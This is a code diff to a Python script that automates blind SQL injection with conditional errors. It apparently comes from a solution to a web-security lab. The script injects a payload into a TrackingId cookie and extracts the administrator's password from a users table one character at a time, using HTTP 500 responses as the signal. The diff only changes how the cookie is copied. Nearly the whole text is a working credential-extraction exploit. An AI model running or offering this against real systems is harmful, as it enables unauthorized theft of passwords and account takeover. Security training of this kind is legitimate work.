@@ -33,12 +33,12 @@ def sendrequest(url: str, proxies: dict, cookies: dict) -> requests.models.Respo
 
 def getpassword(url: str, proxy: dict, cookie: dict) -> list:
      collection = []
-     trackingId = cookie['TrackingId']
      for item in range(1, 25):
           for character in PAYLOAD:
+               new_cookie = cookie.copy()
                # Blind SQL injection with conditional errors
-               cookie['TrackingId'] = f"{trackingId}' AND (SELECT CASE WHEN (SUBSTR(password, {item}, 1) = '{character}') THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')='a"
-               myrequest = sendrequest(url, proxy, cookie)
+               new_cookie["TrackingId"] = f"{new_cookie['TrackingId']}' AND (SELECT CASE WHEN (SUBSTR(password, {item}, 1) = '{character}') THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')='a"
+               myrequest = sendrequest(url, proxy, new_cookie)
                if (myrequest.status_code == 500):
                     collection.append(character)
      return collection
